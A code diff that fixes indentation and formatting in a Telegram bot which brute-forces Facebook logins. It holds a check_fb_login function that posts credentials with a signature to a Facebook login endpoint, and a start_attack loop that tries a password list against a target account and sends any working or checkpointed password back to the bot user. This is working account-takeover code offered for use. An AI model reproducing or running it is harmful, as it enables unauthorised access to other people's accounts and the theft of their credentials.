@@ -36,8 +36,7 @@ def check_fb_login(email, password):
             "locale": "en_US",
             "sdk": "ios",
             "generate_session_cookies": "1",
-            "sig":
-        "3f555f98fb61fcdbf0f44813f82e1aa"
+            "sig": "3f555f98fb61fcdbf0f44813f82e1aa"
         }
         response = requests.get(url, params=params)
         data = response.json()
@@ -59,8 +58,7 @@ def welcome(message):
         "━━━━━━━━━━━━━━━━━━━━━━━━"
     )
     try:
-
-bot.send_photo(message.chat.id, banner_url, caption=welcome_text, parse_mode='Markdown')
+        bot.send_photo(message.chat.id, banner_url, caption=welcome_text, parse_mode='Markdown')
     except:
         bot.send_message(message.chat.id, welcome_text, parse_mode='Markdown')
 
@@ -81,11 +79,16 @@ def start_attack(message):
         total = len(all_passwords)
         for count, pwd in enumerate(all_passwords, 1):
             if not loop_control.get(chat_id):
-                bot.edit_message_text(f"🛑 **Attack Stopped!**\nTarget: `{target_id}`", chat_id, status_msg.message_id)
+                bot.edit_message_text(f"🛑 **Attack Stopped!**", chat_id, status_msg.message_id)
                 return
 
             pwd = pwd.strip()
-            if not pwd or "`\n"
+            if not pwd:
+                continue
+
+            if count % 5 == 0:
+                bot.edit_message_text(
+                    f"🛰 **Working...** `[{count}/{total}]`\n"
                     f"🎯 **Target:** `{target_id}`\n"
                     f"🔥 **Testing:** `{pwd}`", 
                     chat_id, status_msg.message_id, reply_markup=markup, parse_mode='Markdown'
@@ -94,10 +97,10 @@ def start_attack(message):
             result = check_fb_login(target_id, pwd)
             
             if result == "SUCCESS":
-bot.send_message(chat_id, f"✅ **SUCCESS!**\n\n🔑 **Password:** `{pwd}`\n👤 **Target:** `{target_id}`", parse_mode='Markdown')
+                bot.send_message(chat_id, f"✅ **SUCCESS!**\n🔑 Pass: `{pwd}`", parse_mode='Markdown')
                 return
             elif result == "CHECKPOINT":
-                bot.send_message(chat_id, f"⚠️ **CHECKPOINT!**\n\n🔑 **Password:** `{pwd}`\n*Account is locked.*", parse_mode='Markdown')
+                bot.send_message(chat_id, f"⚠️ **CHECKPOINT!**\n🔑 Pass: `{pwd}`", parse_mode='Markdown')
                 return
 
         bot.send_message(chat_id, "❌ **Password Not Found!**")
@@ -107,10 +110,11 @@ bot.send_message(chat_id, f"✅ **SUCCESS!**\n\n🔑 **Password:** `{pwd}`\n👤
 @bot.callback_query_handler(func=lambda call: call.data == "stop_attack")
 def stop(call):
     loop_control[call.message.chat.id] = False
-   bot.answer_callback_query(call.id, "Stopping the attack...")
+    bot.answer_callback_query(call.id, "Stopping the attack...")
 
 if __name__ == "__main__":
     t = Thread(target=run_web)
     t.daemon = True
     t.start()
     bot.polling(none_stop=True)
+                  
